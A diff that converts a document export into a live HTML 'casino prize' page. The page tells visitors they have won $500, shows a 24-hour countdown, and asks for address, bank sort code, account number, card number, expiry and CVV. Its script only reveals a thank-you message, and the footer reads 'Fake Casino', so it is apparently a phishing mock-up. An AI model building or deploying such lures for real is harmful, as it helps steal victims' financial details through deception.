@@ -1,197 +1,172 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-	<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
-	<title></title>
-	<meta name="generator" content="LibreOffice 25.2.3.2 (Linux)"/>
-	<meta name="created" content="2026-08-24T20:48:11.696593938"/>
-	<meta name="changed" content="2026-08-24T20:48:34.648207392"/>
-	<style type="text/css">
-		@page { size: 8.5in 11in; margin: 0.79in }
-		p { margin-bottom: 0.1in; line-height: 115%; background: transparent }
-		pre { background: transparent }
-		pre.western { font-family: "Liberation Mono", monospace; font-size: 10pt }
-		pre.cjk { font-family: "Noto Sans Mono CJK SC", monospace; font-size: 10pt }
-		pre.ctl { font-family: "Liberation Mono", monospace; font-size: 10pt }
-		code.western { font-family: "Liberation Mono", monospace }
-		code.cjk { font-family: "Noto Sans Mono CJK SC", monospace }
-		code.ctl { font-family: "Liberation Mono", monospace }
-	</style>
+    <meta charset="UTF-8">
+    <title>Claim Your Casino Prize</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: #000000;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+        }
+        .logo {
+            display: block;
+            margin: 0 auto 20px;
+            max-width: 200px;
+            height: auto;
+        }
+        header {
+            text-align: center;
+            padding: 20px;
+            background-color: #ff4d00;
+        }
+        header h1 {
+            font-size: 3em;
+        }
+        main {
+            padding: 20px;
+        }
+        .form-section {
+            max-width: 500px;
+            margin: auto;
+            background-color: #111;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        label {
+            font-weight: bold;
+        }
+        input {
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            background-color: #222;
+            color: #fff;
+        }
+        button {
+            padding: 12px;
+            font-size: 1em;
+            background-color: #ff4d00;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background-color: #e64500;
+        }
+        footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 0.9em;
+            color: #ccc;
+        }
+        #timer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 1.2em;
+        }
+        #thank-you {
+            font-size: 1.2em;
+            font-weight: bold;
+            text-align: center;
+            margin-top: 30px;
+        }
+    </style>
 </head>
-<body lang="en-US" link="#000080" vlink="#800000" dir="ltr"><pre class="western"><a name="c"></a><code class="western">&lt;!DOCTYPE html&gt;</code>
-<code class="western">&lt;html lang=&quot;en&quot;&gt;</code>
-<code class="western">&lt;head&gt;</code>
-<code class="western">    </code><code class="western">&lt;meta charset=&quot;UTF-8&quot;&gt;</code>
-<code class="western">    </code><code class="western">&lt;title&gt;Claim Your Casino Prize&lt;/title&gt;</code>
-<code class="western">    </code><code class="western">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</code>
-<code class="western">    </code><code class="western">&lt;style&gt;</code>
-<code class="western">        </code><code class="western">body {</code>
-<code class="western">            </code><code class="western">font-family: 'Arial', sans-serif;</code>
-<code class="western">            </code><code class="western">background: #000000;</code>
-<code class="western">            </code><code class="western">color: #fff;</code>
-<code class="western">            </code><code class="western">margin: 0;</code>
-<code class="western">            </code><code class="western">padding: 0;</code>
-<code class="western">        </code><code class="western">}</code>
-<code class="western">        </code><code class="western">.logo {</code>
-<code class="western">            </code><code class="western">display: block;</code>
-<code class="western">            </code><code class="western">margin: 0 auto 20px;</code>
-<code class="western">            </code><code class="western">max-width: 200px;</code>
-<code class="western">            </code><code class="western">height: auto;</code>
-<code class="western">        </code><code class="western">}</code>
-<code class="western">        </code><code class="western">header {</code>
-<code class="western">            </code><code class="western">text-align: center;</code>
-<code class="western">            </code><code class="western">padding: 20px;</code>
-<code class="western">            </code><code class="western">background-color: #ff4d00;</code>
-<code class="western">        </code><code class="western">}</code>
-<code class="western">        </code><code class="western">header h1 {</code>
-<code class="western">            </code><code class="western">font-size: 3em;</code>
-<code class="western">        </code><code class="western">}</code>
-<code class="western">        </code><code class="western">main {</code>
-<code class="western">            </code><code class="western">padding: 20px;</code>
-<code class="western">        </code><code class="western">}</code>
-<code class="western">        </code><code class="western">.form-section {</code>
-<code class="western">            </code><code class="western">max-width: 500px;</code>
-<code class="western">            </code><code class="western">margin: auto;</code>
-<code class="western">            </code><code class="western">background-color: #111;</code>
-<code class="western">            </code><code class="western">padding: 30px;</code>
-<code class="western">            </code><code class="western">border-radius: 10px;</code>
-<code class="western">            </code><code class="western">box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);</code>
-<code class="western">        </code><code class="western">}</code>
-<code class="western">        </code><code class="western">form {</code>
-<code class="western">            </code><code class="western">display: flex;</code>
-<code class="western">            </code><code class="western">flex-direction: column;</code>
-<code class="western">            </code><code class="western">gap: 15px;</code>
-<code class="western">        </code><code class="western">}</code>
-<code class="western">        </code><code class="western">label {</code>
-<code class="western">            </code><code class="western">font-weight: bold;</code>
-<code class="western">        </code><code class="western">}</code>
-<code class="western">        </code><code class="western">input {</code>
-<code class="western">            </code><code class="western">padding: 10px;</code>
-<code class="western">            </code><code class="western">border: none;</code>
-<code class="western">            </code><code class="western">border-radius: 5px;</code>
-<code class="western">            </code><code class="western">background-color: #222;</code>
-<code class="western">            </code><code class="western">color: #fff;</code>
-<code class="western">        </code><code class="western">}</code>
-<code class="western">        </code><code class="western">button {</code>
-<code class="western">            </code><code class="western">padding: 12px;</code>
-<code class="western">            </code><code class="western">font-size: 1em;</code>
-<code class="western">            </code><code class="western">background-color: #ff4d00;</code>
-<code class="western">            </code><code class="western">color: #fff;</code>
-<code class="western">            </code><code class="western">border: none;</code>
-<code class="western">            </code><code class="western">border-radius: 5px;</code>
-<code class="western">            </code><code class="western">cursor: pointer;</code>
-<code class="western">            </code><code class="western">transition: background 0.3s;</code>
-<code class="western">        </code><code class="western">}</code>
-<code class="western">        </code><code class="western">button:hover {</code>
-<code class="western">            </code><code class="western">background-color: #e64500;</code>
-<code class="western">        </code><code class="western">}</code>
-<code class="western">        </code><code class="western">footer {</code>
-<code class="western">            </code><code class="western">text-align: center;</code>
-<code class="western">            </code><code class="western">padding: 20px;</code>
-<code class="western">            </code><code class="western">font-size: 0.9em;</code>
-<code class="western">            </code><code class="western">color: #ccc;</code>
-<code class="western">        </code><code class="western">}</code>
-<code class="western">        </code><code class="western">#timer {</code>
-<code class="western">            </code><code class="western">text-align: center;</code>
-<code class="western">            </code><code class="western">margin-top: 20px;</code>
-<code class="western">            </code><code class="western">font-size: 1.2em;</code>
-<code class="western">        </code><code class="western">}</code>
-<code class="western">        </code><code class="western">#thank-you {</code>
-<code class="western">            </code><code class="western">font-size: 1.2em;</code>
-<code class="western">            </code><code class="western">font-weight: bold;</code>
-<code class="western">            </code><code class="western">text-align: center;</code>
-<code class="western">            </code><code class="western">margin-top: 30px;</code>
-<code class="western">        </code><code class="western">}</code>
-<code class="western">    </code><code class="western">&lt;/style&gt;</code>
-<code class="western">&lt;/head&gt;</code>
-<code class="western">&lt;body&gt;</code>
-<code class="western">    </code><code class="western">&lt;audio autoplay loop&gt;</code>
-<code class="western">        </code><code class="western">&lt;source src=&quot;casino-sound.mp3&quot; type=&quot;audio/mpeg&quot;&gt;</code>
-<code class="western">        </code><code class="western">Your browser does not support the audio element.</code>
-<code class="western">    </code><code class="western">&lt;/audio&gt;</code>
+<body>
+    <audio autoplay loop>
+        <source src="casino-sound.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
 
-<code class="western">    </code><code class="western">&lt;header&gt;</code>
-<code class="western">        </code><code class="western">&lt;img src=&quot;casino-logo.png&quot; alt=&quot;Casino Logo&quot; class=&quot;logo&quot;&gt;</code>
-<code class="western">        </code><code class="western">&lt;h1&gt;🎉 Casino Prize Claim 🎉&lt;/h1&gt;</code>
-<code class="western">        </code><code class="western">&lt;p&gt;YOU'VE WON A $500 PRIZE!&lt;/p&gt;</code>
-<code class="western">    </code><code class="western">&lt;/header&gt;</code>
+    <header>
+        <img src="casino-logo.png" alt="Casino Logo" class="logo">
+        <h1>🎉 Casino Prize Claim 🎉</h1>
+        <p>YOU'VE WON A $500 PRIZE!</p>
+    </header>
 
-<code class="western">    </code><code class="western">&lt;main&gt;</code>
-<code class="western">        </code><code class="western">&lt;section class=&quot;form-section&quot;&gt;</code>
-<code class="western">            </code><code class="western">&lt;h2&gt;Enter Your Details to Claim Your Prize&lt;/h2&gt;</code>
-<code class="western">            </code><code class="western">&lt;form id=&quot;claim-form&quot;&gt;</code>
-<code class="western">                </code><code class="western">&lt;label for=&quot;name&quot;&gt;Full Name:&lt;/label&gt;</code>
-<code class="western">                </code><code class="western">&lt;input type=&quot;text&quot; id=&quot;name&quot; required&gt;</code>
+    <main>
+        <section class="form-section">
+            <h2>Enter Your Details to Claim Your Prize</h2>
+            <form id="claim-form">
+                <label for="name">Full Name:</label>
+                <input type="text" id="name" required>
 
-<code class="western">                </code><code class="western">&lt;label for=&quot;address&quot;&gt;Address:&lt;/label&gt;</code>
-<code class="western">                </code><code class="western">&lt;input type=&quot;text&quot; id=&quot;address&quot; required&gt;</code>
+                <label for="address">Address:</label>
+                <input type="text" id="address" required>
 
-<code class="western">                </code><code class="western">&lt;label for=&quot;email&quot;&gt;Email Address:&lt;/label&gt;</code>
-<code class="western">                </code><code class="western">&lt;input type=&quot;email&quot; id=&quot;email&quot; required&gt;</code>
+                <label for="email">Email Address:</label>
+                <input type="email" id="email" required>
 
-<code class="western">                </code><code class="western">&lt;label for=&quot;sort-code&quot;&gt;Sort Code:&lt;/label&gt;</code>
-<code class="western">                </code><code class="western">&lt;input type=&quot;text&quot; id=&quot;sort-code&quot; required&gt;</code>
+                <label for="sort-code">Sort Code:</label>
+                <input type="text" id="sort-code" required>
 
-<code class="western">                </code><code class="western">&lt;label for=&quot;account-number&quot;&gt;Account Number:&lt;/label&gt;</code>
-<code class="western">                </code><code class="western">&lt;input type=&quot;text&quot; id=&quot;account-number&quot; required&gt;</code>
+                <label for="account-number">Account Number:</label>
+                <input type="text" id="account-number" required>
 
-<code class="western">                </code><code class="western">&lt;label for=&quot;card-number&quot;&gt;Card Number:&lt;/label&gt;</code>
-<code class="western">                </code><code class="western">&lt;input type=&quot;text&quot; id=&quot;card-number&quot; required&gt;</code>
+                <label for="card-number">Card Number:</label>
+                <input type="text" id="card-number" required>
 
-<code class="western">                </code><code class="western">&lt;label for=&quot;expiry&quot;&gt;Expiry Date:&lt;/label&gt;</code>
-<code class="western">                </code><code class="western">&lt;input type=&quot;text&quot; id=&quot;expiry&quot; placeholder=&quot;MM/YY&quot; required&gt;</code>
+                <label for="expiry">Expiry Date:</label>
+                <input type="text" id="expiry" placeholder="MM/YY" required>
 
-<code class="western">                </code><code class="western">&lt;label for=&quot;cvv&quot;&gt;CVV:&lt;/label&gt;</code>
-<code class="western">                </code><code class="western">&lt;input type=&quot;text&quot; id=&quot;cvv&quot; required&gt;</code>
+                <label for="cvv">CVV:</label>
+                <input type="text" id="cvv" required>
 
-<code class="western">                </code><code class="western">&lt;button type=&quot;submit&quot;&gt;Claim Prize&lt;/button&gt;</code>
-<code class="western">            </code><code class="western">&lt;/form&gt;</code>
-<code class="western">        </code><code class="western">&lt;/section&gt;</code>
-<code class="western">    </code><code class="western">&lt;/main&gt;</code>
+                <button type="submit">Claim Prize</button>
+            </form>
+        </section>
+    </main>
 
-<code class="western">    </code><code class="western">&lt;footer&gt;</code>
-<code class="western">        </code><code class="western">&lt;p&gt;&amp;copy; 2025 Fake Casino. All rights reserved.&lt;/p&gt;</code>
-<code class="western">        </code><code class="western">&lt;a href=&quot;terms.html&quot; target=&quot;_blank&quot;&gt;Terms &amp;amp; Conditions&lt;/a&gt;</code>
-<code class="western">        </code><code class="western">&lt;a href=&quot;support.html&quot; target=&quot;_blank&quot;&gt;Support&lt;/a&gt;</code>
-<code class="western">    </code><code class="western">&lt;/footer&gt;</code>
+    <footer>
+        <p>© 2025 Fake Casino. All rights reserved.</p>
+        <a href="terms.html" target="_blank">Terms & Conditions</a>
+        <a href="support.html" target="_blank">Support</a>
+    </footer>
 
-<code class="western">    </code><code class="western">&lt;div id=&quot;thank-you&quot; style=&quot;display: none;&quot;&gt;</code>
-<code class="western">        </code><code class="western">&lt;p&gt;🎉 Thank you for claiming your prize! Your details have been processed.&lt;/p&gt;</code>
-<code class="western">        </code><code class="western">&lt;p&gt;You will receive your $500 prize in 24 hours.&lt;/p&gt;</code>
-<code class="western">    </code><code class="western">&lt;/div&gt;</code>
+    <div id="thank-you" style="display: none;">
+        <p>🎉 Thank you for claiming your prize! Your details have been processed.</p>
+        <p>You will receive your $500 prize in 24 hours.</p>
+    </div>
 
-<code class="western">    </code><code class="western">&lt;div id=&quot;timer&quot;&gt;&lt;/div&gt;</code>
+    <div id="timer"></div>
 
-<code class="western">    </code><code class="western">&lt;script&gt;</code>
-<code class="western">        </code><code class="western">let timeLeft = 24 * 60 * 60; // 24 hours in seconds</code>
-<code class="western">        </code><code class="western">const timerDisplay = document.getElementById(&quot;timer&quot;);</code>
+    <script>
+        let timeLeft = 24 * 60 * 60; // 24 hours in seconds
+        const timerDisplay = document.getElementById("timer");
 
-<code class="western">        </code><code class="western">function updateTimer() {</code>
-<code class="western">            </code><code class="western">let hours = Math.floor(timeLeft / 3600);</code>
-<code class="western">            </code><code class="western">let minutes = Math.floor((timeLeft % 3600) / 60);</code>
-<code class="western">            </code><code class="western">let seconds = timeLeft % 60;</code>
+        function updateTimer() {
+            let hours = Math.floor(timeLeft / 3600);
+            let minutes = Math.floor((timeLeft % 3600) / 60);
+            let seconds = timeLeft % 60;
 
-<code class="western">            </code><code class="western">timerDisplay.innerHTML = </code>
-<code class="western">                </code><code class="western">&quot;⏳ Time Left: &quot; + </code>
-<code class="western">                </code><code class="western">String(hours).padStart(2, '0') + &quot;:&quot; + </code>
-<code class="western">                </code><code class="western">String(minutes).padStart(2, '0') + &quot;:&quot; + </code>
-<code class="western">                </code><code class="western">String(seconds).padStart(2, '0');</code>
+            timerDisplay.innerHTML = 
+                "⏳ Time Left: " + 
+                String(hours).padStart(2, '0') + ":" + 
+                String(minutes).padStart(2, '0') + ":" + 
+                String(seconds).padStart(2, '0');
 
-<code class="western">            </code><code class="western">timeLeft--;</code>
-<code class="western">        </code><code class="western">}</code>
+            timeLeft--;
+        }
 
-<code class="western">        </code><code class="western">setInterval(updateTimer, 1000);</code>
-<code class="western">        </code><code class="western">updateTimer(); // Initial call</code>
+        setInterval(updateTimer, 1000);
+        updateTimer(); // Initial call
 
-<code class="western">        </code><code class="western">document.getElementById(&quot;claim-form&quot;).addEventListener(&quot;submit&quot;, function (e) {</code>
-<code class="western">            </code><code class="western">e.preventDefault();</code>
-<code class="western">            </code><code class="western">document.getElementById(&quot;thank-you&quot;).style.display = &quot;block&quot;;</code>
-<code class="western">        </code><code class="western">});</code>
-<code class="western">    </code><code class="western">&lt;/script&gt;</code>
-<code class="western">&lt;/body&gt;</code>
-<code class="western">&lt;/html&gt;</code></pre><p style="line-height: 100%; margin-bottom: 0in">
-<br/>
-
-</p>
+        document.getElementById("claim-form").addEventListener("submit", function (e) {
+            e.preventDefault();
+            document.getElementById("thank-you").style.display = "block";
+        });
+    </script>
 </body>
 </html>
